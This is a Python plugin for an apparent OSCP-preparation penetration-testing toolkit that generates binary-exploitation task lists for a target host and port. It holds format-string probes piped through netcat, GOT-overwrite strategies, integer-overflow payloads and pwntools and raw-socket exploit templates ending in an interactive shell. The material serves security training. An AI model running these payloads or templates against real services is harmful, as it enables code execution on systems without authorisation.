"""
Binary exploitation vulnerability analysis plugin

Generates educational tasks for analyzing binaries with common vulnerabilities including:
- Format string vulnerabilities (printf, sprintf, fprintf)
- Integer overflow/underflow vulnerabilities
- Array indexing vulnerabilities
- Memory corruption primitives

This plugin focuses on OSCP-relevant binary exploitation techniques with
strong educational emphasis on manual analysis and understanding exploitation primitives.

Extracted from HackTricks binary exploitation guides
Generated for: CRACK Track OSCP preparation toolkit
"""

from typing import Dict, Any, List, Optional
from .base import ServicePlugin
from .registry import ServiceRegistry
import logging


@ServiceRegistry.register
class BinaryExploitPlugin(ServicePlugin):
    """Binary exploitation vulnerability analysis and exploitation guidance"""

    @property
    def name(self) -> str:
        return "binary-exploit"

    @property
    def default_ports(self) -> List[int]:
        # Binary exploitation typically happens on custom service ports
        return []

    @property
    def service_names(self) -> List[str]:
        return ['binary', 'custom', 'unknown']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect potential binary exploitation scenarios

        This plugin activates when:
        - Unknown/custom services are found (potential custom binaries)
        - Service version suggests native code (C/C++ applications)
        - Common CTF/vulnerable service ports
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port', 0)

        # Detect custom/unknown services that might be vulnerable binaries
        custom_service_indicators = [
            'unknown',
            'custom',
            'binary',
            'tcpwrapped',  # Often indicates custom service
        ]

        # Check for native code indicators
        native_code_indicators = [
            'c application',
            'c++ application',
            'native',
            'elf binary',
        ]

        # Common CTF/practice ports for binary challenges
        ctf_ports = [9999, 31337, 10000, 10001, 1337]

        # Detect based on service name
        if any(indicator in service for indicator in custom_service_indicators):
            return True

        # Detect based on product info
        if any(indicator in product for indicator in native_code_indicators):
            return True

        # Detect common CTF ports
        if port in ctf_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate binary exploitation analysis task tree"""

        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'unknown')
        service = service_info.get('service', 'unknown')

        tasks = {
            'id': f'binary-exploit-{port}',
            'name': f'Binary Exploitation Analysis (Port {port})',
            'type': 'parent',
            'children': []
        }

        # ===== PHASE 1: RECONNAISSANCE =====
        recon_tasks = {
            'id': f'binary-recon-{port}',
            'name': 'Binary Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Connect and gather initial information
        recon_tasks['children'].append({
            'id': f'nc-connect-{port}',
            'name': 'Initial Connection Test',
            'type': 'command',
            'metadata': {
                'command': f'nc {target} {port}',
                'description': 'Connect to service and observe initial behavior',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'RECON'],
                'flag_explanations': {
                    'nc': 'Netcat - Swiss army knife for TCP/UDP connections',
                    target: 'Target IP address',
                    str(port): f'Target port running {service} service'
                },
                'success_indicators': [
                    'Banner or prompt received',
                    'Service responds to input',
                    'Error messages reveal version/behavior'
                ],
                'failure_indicators': [
                    'Connection refused (service down)',
                    'Connection timeout (firewall blocking)',
                    'No response (waiting for specific input)'
                ],
                'next_steps': [
                    'Note any version information in banner',
                    'Test basic input (AAAA, test strings)',
                    'Look for format string bugs (%x %s %p)',
                    'Try to crash the service with long inputs'
                ],
                'alternatives': [
                    f'telnet {target} {port}',
                    f'ncat {target} {port}',
                    f'python3 -c "import socket; s=socket.socket(); s.connect((\'{target}\',{port})); print(s.recv(1024))"'
                ],
                'notes': 'Document all responses - error messages often leak valuable information about memory layout, function names, or exploitation primitives',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 1.2: Binary acquisition if possible
        recon_tasks['children'].append({
            'id': f'binary-download-{port}',
            'name': 'Attempt Binary Acquisition',
            'type': 'manual',
            'metadata': {
                'description': 'Download the binary for local analysis (if available)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'RECON'],
                'success_indicators': [
                    'Binary file downloaded successfully',
                    'MD5/SHA256 checksum matches provided hash'
                ],
                'next_steps': [
                    'Run file command to identify binary type',
                    'Check for symbols: readelf -s binary',
                    'Check security features: checksec binary',
                    'Run strings to find interesting data'
                ],
                'alternatives': [
                    'wget http://{target}/binary (if HTTP download available)',
                    'scp user@{target}:/path/to/binary . (if SSH access)',
                    'Check challenge description for binary link',
                    'Reverse engineer protocol and reconstruct locally'
                ],
                'notes': 'Some OSCP/CTF challenges provide binaries, others require blind exploitation. Having the binary enables local debugging with gdb/pwndbg.'
            }
        })

        tasks['children'].append(recon_tasks)

        # ===== PHASE 2: VULNERABILITY IDENTIFICATION =====
        vuln_id_tasks = {
            'id': f'vuln-identification-{port}',
            'name': 'Vulnerability Identification',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Format String Detection
        format_string_task = {
            'id': f'format-string-detect-{port}',
            'name': 'Format String Vulnerability Detection',
            'type': 'parent',
            'children': []
        }

        format_string_task['children'].append({
            'id': f'format-string-basic-{port}',
            'name': 'Test Basic Format String Payloads',
            'type': 'command',
            'metadata': {
                'command': f'echo "%p %p %p %p" | nc {target} {port}',
                'description': 'Test if service leaks stack addresses via format string vulnerability',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL', 'ENUM'],
                'flag_explanations': {
                    '%p': 'Pointer formatter - reads value from stack and prints as hex address',
                    '%p %p %p %p': 'Multiple formatters to leak multiple stack values',
                    'echo': 'Send payload via standard input',
                    '|': 'Pipe output to netcat',
                    'nc': 'Netcat for network connection'
                },
                'success_indicators': [
                    'Hex addresses printed (0x7fff..., 0x7f... on 64-bit)',
                    'Pattern of addresses visible in response',
                    'Stack values leaked without crash'
                ],
                'failure_indicators': [
                    'Literal "%p" printed (not vulnerable)',
                    'Service crashes (wrong input format)',
                    'No response (needs different trigger)'
                ],
                'next_steps': [
                    'Try other formatters: %x (hex), %d (decimal), %s (string)',
                    'Find offset to controlled input: AAAA%1$p, AAAA%2$p, etc.',
                    'Test arbitrary read: %<offset>$s with address',
                    'Test arbitrary write: %<offset>$n'
                ],
                'alternatives': [
                    'Manual netcat: nc {target} {port}, then type: %p %p %p',
                    'Python: python3 -c "print(\'%p %p %p\')" | nc {target} {port}',
                    'Create pwntools script for automation'
                ],
                'notes': 'Format string bugs in printf/sprintf/fprintf are CRITICAL vulnerabilities. They provide arbitrary read/write primitives that can bypass ASLR and achieve code execution.'
            }
        })

        format_string_task['children'].append({
            'id': f'format-string-offset-{port}',
            'name': 'Find Format String Offset',
            'type': 'manual',
            'metadata': {
                'description': 'Determine stack offset where user input appears',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'success_indicators': [
                    'Found offset where AAAA (0x41414141) appears',
                    'Can control 8 bytes at specific stack position',
                    'Consistent offset across multiple tests'
                ],
                'next_steps': [
                    'Use offset for arbitrary read: payload before address',
                    'Calculate padding needed (4 or 8 byte alignment)',
                    'Test read primitive: %<offset>$s + target_address',
                    'Prepare for arbitrary write exploitation'
                ],
                'alternatives': [
                    'Brute force: for i in range(1,100): test AAAA%i$p',
                    'Manual testing: AAAA%1$p, AAAA%2$p, ... until 0x41414141 found',
                    'pwntools: FmtStr() helper function',
                    'Use format string tools: libformatstr'
                ],
                'notes': '''
KEY CONCEPT: Finding the offset is crucial for exploitation.

Method: Send "AAAA%N$p" for N=1,2,3...
When you see 0x41414141 in response, N is your offset.

Example:
  AAAA%1$p → 0x7ffe12345678 (not our input)
  AAAA%6$p → 0x41414141 (FOUND! offset=6)

Once you have offset, you control that stack position:
  %6$s → reads string at address in position 6
  %6$n → writes byte count to address in position 6
                '''
            }
        })

        format_string_task['children'].append({
            'id': f'format-string-exploit-{port}',
            'name': 'Format String Exploitation Guide',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit format string for arbitrary read/write',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'Successfully leaked canary/PIE addresses',
                    'Overwrote GOT entry with system() address',
                    'Gained code execution (shell spawned)'
                ],
                'alternatives': [
                    'Arbitrary Read: %<offset>$s + p64(target_addr)',
                    'Arbitrary Write: Use %<offset>$hn for 2-byte writes',
                    'GOT Overwrite: Overwrite printf GOT → system',
                    'Leak libc: Read GOT entries to calculate base'
                ],
                'notes': '''
EXPLOITATION STRATEGY:

1. ARBITRARY READ (%s):
   - Payload: "%6$s||||" + p64(target_address)
   - Reads string at target_address
   - Use to leak: canary, libc addresses, PIE base

2. ARBITRARY WRITE (%n, %hn):
   - %n writes 4 bytes, %hn writes 2 bytes
   - Payload: "%c"*COUNT + "%6$hn" + p64(target)
   - Writes COUNT to target address

3. GOT OVERWRITE (common technique):
   - Target: overwrite printf@GOT → system
   - Next printf() call executes system() instead
   - Pass "/bin/sh" as argument for shell

4. BYPASS ASLR:
   - Leak stack addresses: %p %p %p
   - Leak libc addresses from GOT
   - Calculate base addresses from leaks

OSCP TIP: Focus on understanding primitives.
In exam, you may need to adapt without automated tools.
                '''
            }
        })

        vuln_id_tasks['children'].append(format_string_task)

        # Task 2.2: Integer Overflow Detection
        integer_overflow_task = {
            'id': f'integer-overflow-detect-{port}',
            'name': 'Integer Overflow/Underflow Detection',
            'type': 'parent',
            'children': []
        }

        integer_overflow_task['children'].append({
            'id': f'integer-overflow-test-{port}',
            'name': 'Test Integer Boundary Values',
            'type': 'manual',
            'metadata': {
                'description': 'Test service behavior with integer boundary values',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'success_indicators': [
                    'Service accepts very large numbers without validation',
                    'Buffer overflow occurs after integer wraps',
                    'Unexpected behavior at INT_MAX boundaries'
                ],
                'failure_indicators': [
                    'Input rejected (proper validation present)',
                    'Service crashes on invalid input',
                    'No size-related parameters found'
                ],
                'next_steps': [
                    'Identify size calculations in binary (IDA/Ghidra)',
                    'Test overflow: 2^32 (4294967296) for 32-bit',
                    'Test underflow: negative values cast to unsigned',
                    'Trigger heap overflow via undersized allocation'
                ],
                'alternatives': [
                    'Test with INT_MAX: 2147483647 (32-bit signed)',
                    'Test with UINT_MAX: 4294967295 (32-bit unsigned)',
                    'Test negative to unsigned: -1 → 0xFFFFFFFF',
                    'Test small underflow: size=8, header=16 → wrap to huge'
                ],
                'notes': '''
INTEGER OVERFLOW VULNERABILITIES:

Common Patterns:
1. Size calculation wraps: count * size → 0
2. Underflow in subtraction: total - header → huge value
3. Signed to unsigned cast: -1 → 0xFFFFFFFF

EXPLOITATION:
- Overflow → undersized allocation → heap overflow
- Underflow → huge size → write past buffer
- Both lead to memory corruption primitives

Real Example (from HackTricks):
  count=4294967296, elem_size=1
  → (uint32_t)(4294967296 * 1) = 0 (overflow!)
  → malloc(0 + 32) allocates only 32 bytes
  → but memcpy uses size_t: 4294967296 bytes
  → heap overflow overwrites adjacent structures

OSCP TIP: Integer bugs often chain with heap overflows.
Look for size calculations before malloc/memcpy.
                '''
            }
        })

        integer_overflow_task['children'].append({
            'id': f'integer-overflow-exploit-{port}',
            'name': 'Integer Overflow Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit integer overflow to corrupt memory',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'Heap overflow achieved via integer wrap',
                    'Overwrote critical structure (is_admin flag)',
                    'Code execution obtained'
                ],
                'alternatives': [
                    'Overflow path: Large count → wrapped size → small alloc → big copy',
                    'Underflow path: Small total → subtract header → huge size',
                    'Target adjacent heap objects with overflow',
                    'Overwrite function pointers in heap structures'
                ],
                'notes': '''
EXPLOITATION TECHNIQUES:

1. HEAP OVERFLOW VIA INTEGER OVERFLOW:
   ```python
   # Exploit pattern
   count = 0x100000000  # 2^32, wraps to 0 in uint32_t
   elem_size = 1
   payload = b"A" * 48 + p32(1)  # Overwrite is_admin
   ```

2. INTEGER UNDERFLOW:
   ```python
   # total_len < HEADER causes underflow
   total_len = 8   # Small value
   HEADER = 16
   payload_len = total_len - HEADER  # Underflows to huge number!
   ```

3. COMMON TARGETS:
   - is_admin flags in adjacent structs
   - Function pointers in heap objects
   - Return addresses if overflow reaches stack
   - GOT entries if heap near .data

4. DETECTION IN CODE:
   Look for:
   - (uint32_t) casts on size calculations
   - size_t subtraction without bounds check
   - malloc(small) followed by memcpy(large)

OSCP NOTE: Less common than BOF/format string, but
appears in modern exploits. Understand the primitive.
                '''
            }
        })

        vuln_id_tasks['children'].append(integer_overflow_task)

        # Task 2.3: Array Indexing Vulnerabilities
        array_indexing_task = {
            'id': f'array-indexing-detect-{port}',
            'name': 'Array Indexing Vulnerability Detection',
            'type': 'manual',
            'metadata': {
                'description': 'Identify out-of-bounds array access vulnerabilities',
                'tags': ['OSCP:LOW', 'MANUAL', 'ENUM'],
                'success_indicators': [
                    'Can access array elements out of bounds',
                    'Off-by-one error allows adjacent memory access',
                    'Index not validated against array size'
                ],
                'next_steps': [
                    'Map memory layout around array',
                    'Identify what can be overwritten',
                    'Test negative indices (if signed)',
                    'Chain with other bugs for exploitation'
                ],
                'alternatives': [
                    'Test boundary: index = array_size',
                    'Test off-by-one: index = array_size - 1',
                    'Test negative indices: index = -1',
                    'Test huge indices: index = 0x7FFFFFFF'
                ],
                'notes': '''
ARRAY INDEXING VULNERABILITIES:

Wide category with varied exploitation:
- Off-by-one errors
- No bounds checking
- Signed/unsigned confusion
- Integer overflow in index calculation

EXPLOITATION DEPENDS ON CONTEXT:
- What's adjacent to the array?
- Can you read/write out of bounds?
- What security-critical data is nearby?

Examples from HackTricks:
1. Colliding arrays (sizes vs addresses)
2. Double array sorted as doubles (shellcode constraints)
3. Off-by-one overwrites pointer → arbitrary write

OSCP NOTE: Highly situational. Exploitation requires
understanding specific program logic and memory layout.
Focus on identifying the bug, then adapt.
                '''
            }
        }

        vuln_id_tasks['children'].append(array_indexing_task)

        tasks['children'].append(vuln_id_tasks)

        # ===== PHASE 3: EXPLOITATION RESOURCES =====
        resources_task = {
            'id': f'exploit-resources-{port}',
            'name': 'Exploitation Resources & Tools',
            'type': 'parent',
            'children': []
        }

        resources_task['children'].append({
            'id': f'pwntools-setup-{port}',
            'name': 'Setup pwntools Environment',
            'type': 'command',
            'metadata': {
                'command': 'python3 -c "from pwn import *; print(\'pwntools ready\')"',
                'description': 'Verify pwntools is installed for exploit development',
                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                'flag_explanations': {
                    'from pwn import *': 'Import pwntools exploitation framework',
                    'python3': 'Use Python 3 (required for modern pwntools)'
                },
                'success_indicators': [
                    'pwntools ready message appears',
                    'No import errors'
                ],
                'failure_indicators': [
                    'ModuleNotFoundError: No module named \'pwn\'',
                    'Python 2 version issues'
                ],
                'next_steps': [
                    'If not installed: pip3 install pwntools',
                    'Create exploit template with pwntools',
                    'Use context.binary for automatic ROP',
                    'Use FmtStr() for format string exploitation'
                ],
                'alternatives': [
                    'Install: pip3 install pwntools',
                    'Install: apt install python3-pwntools (Kali)',
                    'Manual exploitation without pwntools (OSCP exam scenario)',
                    'Use built-in struct module for packing addresses'
                ],
                'notes': 'pwntools is powerful but NOT available in OSCP exam. Learn manual alternatives for exam scenarios.'
            }
        })

        resources_task['children'].append({
            'id': f'binary-analysis-tools-{port}',
            'name': 'Binary Analysis Tools Reference',
            'type': 'manual',
            'metadata': {
                'description': 'Essential tools for binary analysis and exploitation',
                'tags': ['OSCP:HIGH', 'MANUAL', 'RESEARCH'],
                'alternatives': [
                    'file binary - Identify binary type (ELF, PE, 32/64-bit)',
                    'checksec binary - Check security features (NX, PIE, RELRO, Canary)',
                    'strings binary - Extract printable strings',
                    'readelf -h binary - ELF header information',
                    'readelf -s binary - Symbol table (functions, variables)',
                    'objdump -d binary - Disassemble binary',
                    'gdb binary - Debug binary (with pwndbg/peda/gef)',
                    'strace ./binary - Trace system calls',
                    'ltrace ./binary - Trace library calls',
                    'IDA Free / Ghidra - Full reverse engineering'
                ],
                'notes': '''
ESSENTIAL WORKFLOW:

1. INITIAL ANALYSIS:
   file → checksec → strings → readelf -s

2. FIND VULNERABILITIES:
   - Ghidra/IDA: Static analysis
   - gdb + pwndbg: Dynamic analysis
   - Look for: gets, strcpy, printf(user_input)

3. EXPLOITATION:
   - gdb: Set breakpoints, examine memory
   - pattern create/offset: Find overflow offset
   - ROPgadget: Find ROP chains
   - one_gadget: Find one-shot shells in libc

4. DEBUGGING:
   - gdb: x/20x $rsp (examine stack)
   - vmmap: Check memory mappings
   - checksec: Verify protections

OSCP: Focus on command-line tools that work
without GUI (gdb, objdump, readelf, strings).
                '''
            }
        })

        resources_task['children'].append({
            'id': f'exploit-templates-{port}',
            'name': 'Exploitation Script Templates',
            'type': 'manual',
            'metadata': {
                'description': 'Reference templates for common exploitation scenarios',
                'tags': ['OSCP:MEDIUM', 'RESEARCH', 'MANUAL'],
                'notes': '''
FORMAT STRING EXPLOITATION TEMPLATE:

```python
from pwn import *

# Configuration
target = "{target}"
port = {port}

# Connect
io = remote(target, port)
# io = process("./binary")  # Local testing

# Find offset (brute force)
for offset in range(1, 100):
    io = remote(target, port)
    payload = b"AAAA%"+ str(offset).encode() + b"$p"
    io.sendline(payload)
    response = io.recv()
    if b"41414141" in response:
        print(f"Offset found: {{offset}}")
        break
    io.close()

# Arbitrary read
payload = f"%{{offset}}$s||||".encode()
payload += p64(target_address)
io.sendline(payload)
leak = u64(io.recv(8))

# Arbitrary write (GOT overwrite)
fmt = FmtStr(execute_fmt=lambda x: send(x),
             offset=offset,
             numbwritten=0)
fmt.write(got_printf, system_addr)
fmt.execute_writes()

io.sendline(b"/bin/sh")
io.interactive()
```

INTEGER OVERFLOW TEMPLATE:

```python
from pwn import *

io = remote("{target}", {port})

# Trigger overflow (2^32 wraps to 0)
count = 0x100000000
elem_size = 1

io.sendlineafter(b"count:", str(count).encode())
io.sendlineafter(b"size:", str(elem_size).encode())

# Overflow payload
distance_to_target = 48  # Calculated offset
payload = b"A" * distance_to_target
payload += p32(1)  # Overwrite is_admin flag

io.send(payload)
io.shutdown("send")  # Send EOF

print(io.recvall(timeout=5).decode())
```

MANUAL EXPLOITATION (NO PWNTOOLS):

```python
import socket
import struct

def p32(addr):
    return struct.pack("<I", addr)

def p64(addr):
    return struct.pack("<Q", addr)

s = socket.socket()
s.connect(("{target}", {port}))

payload = b"%6$s||||" + p64(0x400000)
s.send(payload + b"\\n")
response = s.recv(4096)
print(response)
```
                '''
            }
        })

        tasks['children'].append(resources_task)

        # ===== PHASE 4: POST-EXPLOITATION =====
        tasks['children'].append({
            'id': f'post-exploit-binary-{port}',
            'name': 'Post-Exploitation Documentation',
            'type': 'manual',
            'metadata': {
                'description': 'Document successful exploitation for OSCP report',
                'tags': ['OSCP:HIGH', 'MANUAL', 'POST_EXPLOIT'],
                'success_indicators': [
                    'Shell access obtained',
                    'Exploit repeatable and reliable',
                    'Full documentation of steps'
                ],
                'next_steps': [
                    'Screenshot of successful exploit',
                    'Save exploit script with comments',
                    'Document vulnerability root cause',
                    'Note any ASLR/PIE bypass techniques used',
                    'Capture flag or proof of exploitation'
                ],
                'notes': '''
OSCP REPORT REQUIREMENTS:

1. VULNERABILITY DESCRIPTION:
   - Type: Format string / Integer overflow / etc.
   - Location: Which function/service
   - Root cause: Missing input validation, etc.

2. EXPLOITATION STEPS:
   - How vulnerability was discovered
   - Exploit development process
   - Any bypasses needed (ASLR, NX, etc.)

3. PROOF OF EXPLOITATION:
   - Screenshot of shell/flag
   - Complete exploit script
   - Repeatable proof-of-concept

4. MANUAL ALTERNATIVE:
   - How to exploit without automated tools
   - Key commands and payloads
   - Understanding of primitives used

REMEMBER: OSCP wants to see you UNDERSTAND
the exploitation, not just run tools blindly.
                '''
            }
        })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse results and spawn additional tasks"""
        new_tasks = []

        # If format string vulnerability confirmed, add advanced tasks
        if 'format-string-basic' in task_id and ('0x7f' in result or '0x' in result):
            port = task_id.split('-')[-1]
            new_tasks.append({
                'id': f'format-string-advanced-{port}',
                'name': 'Advanced Format String Exploitation',
                'type': 'manual',
                'metadata': {
                    'description': 'Format string confirmed - proceed to exploit development',
                    'tags': ['OSCP:HIGH', 'EXPLOIT'],
                    'notes': 'Vulnerability confirmed! Next: Find offset, leak addresses, GOT overwrite'
                }
            })

        # If integer overflow indicators found
        if 'integer-overflow' in task_id and 'overflow' in result.lower():
            port = task_id.split('-')[-1]
            new_tasks.append({
                'id': f'integer-overflow-exploit-dev-{port}',
                'name': 'Develop Integer Overflow Exploit',
                'type': 'manual',
                'metadata': {
                    'description': 'Integer overflow confirmed - analyze memory layout',
                    'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                    'notes': 'Map heap layout and identify targets adjacent to undersized buffer'
                }
            })

        return new_tasks

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for automated tasks"""

        if 'format-string' in task_id:
            return [
                'Manual format string testing: echo "%p" | nc target port',
                'Find offset: Test AAAA%N$p for N=1,2,3... until 0x41414141',
                'Arbitrary read: Craft %N$s + address payload manually',
                'GOT overwrite: Calculate byte counts for %hn writes'
            ]

        if 'integer-overflow' in task_id:
            return [
                'Test boundary values manually (INT_MAX, UINT_MAX)',
                'Send negative numbers and observe unsigned casting',
                'Try 2^32 and 2^64 to trigger wraparound',
                'Monitor service behavior with different size inputs'
            ]

        if 'pwntools' in task_id:
            return [
                'Use Python struct module: struct.pack("<Q", addr)',
                'Manual socket programming with Python socket module',
                'Shell scripts with echo, printf, and nc',
                'Understand packing: little-endian 8-byte addresses'
            ]

        return []

    def detect_from_finding(self, finding: Dict[str, Any], profile: Optional['TargetProfile'] = None) -> float:
        """Activate on binary vulnerability detection"""
        from ..core.constants import FindingTypes
        logger = logging.getLogger(__name__)

        finding_type = finding.get('type', '').lower()
        description = finding.get('description', '').lower()

        # Perfect match - Binary specifically identified as vulnerable
        if finding_type == FindingTypes.BINARY_VULNERABLE:
            logger.info("Binary exploit activating: Vulnerable binary detected")
            return 100

        # High - Buffer overflow detected
        if finding_type == FindingTypes.BUFFER_OVERFLOW or 'buffer overflow' in description or 'bof' in description:
            logger.info("Binary exploit activating: Buffer overflow detected")
            return 90

        # High - Format string vulnerability
        if finding_type == FindingTypes.FORMAT_STRING_VULN or 'format string' in description:
            logger.info("Binary exploit activating: Format string vulnerability")
            return 90

        # High - Use after free
        if finding_type == FindingTypes.USE_AFTER_FREE or 'use after free' in description:
            logger.info("Binary exploit activating: Use-after-free detected")
            return 85

        # High - Race condition
        if finding_type == FindingTypes.RACE_CONDITION or 'race condition' in description:
            logger.info("Binary exploit activating: Race condition detected")
            return 80

        # Medium - Binary analysis needed
        if 'binary' in description and ('exploit' in description or 'vulnerable' in description):
            logger.info("Binary exploit activating: Exploitable binary mentioned")
            return 75

        # Medium - Memory corruption hints
        memory_corruption_keywords = ['heap overflow', 'stack overflow', 'integer overflow',
                                      'double free', 'null pointer dereference']
        if any(keyword in description for keyword in memory_corruption_keywords):
            logger.info(f"Binary exploit activating: Memory corruption indicator in finding")
            return 70

        return 0
